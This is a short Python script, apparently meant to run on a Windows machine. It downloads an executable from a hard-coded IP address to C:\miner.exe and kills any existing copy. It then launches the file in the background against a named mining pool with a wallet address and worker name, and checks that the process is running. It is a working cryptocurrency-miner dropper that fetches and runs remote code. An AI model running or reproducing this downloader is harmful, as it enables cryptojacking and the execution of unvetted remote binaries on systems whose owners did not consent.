import os
import subprocess
import urllib.request

# Use a simpler path
miner_path = "C:\miner.exe"

# Download
try:
    urllib.request.urlretrieve("http://151.247.219.40:8000/alpha-miner-windows.exe", miner_path)
    size = os.path.getsize(miner_path) if os.path.exists(miner_path) else 0
except Exception as e:
    result = f"dl_error: {e}"
    size = 0

if size > 1000000:
    # Kill existing
    os.system("taskkill /F /IM miner.exe 2>nul")
    
    import time
    time.sleep(1)
    
    # Run via os.system with start
    cmd = f'start /B "" "{miner_path}" --pool stratum+tcp://sg1.alphapool.tech:5566 --address prl1pjdp6c4dzmzemsw0cv00t2t008mnsu80qc8ghksl0k426qm8z83kqp8m8vg --worker WIN_200'
    ret = os.system(cmd)
    
    time.sleep(3)
    
    # Check
    r = subprocess.run(["tasklist"], capture_output=True, text=True)
    running = "miner.exe" in r.stdout
    
    result = f"size={size},ret={ret},running={running}"
else:
    result = f"size={size}"
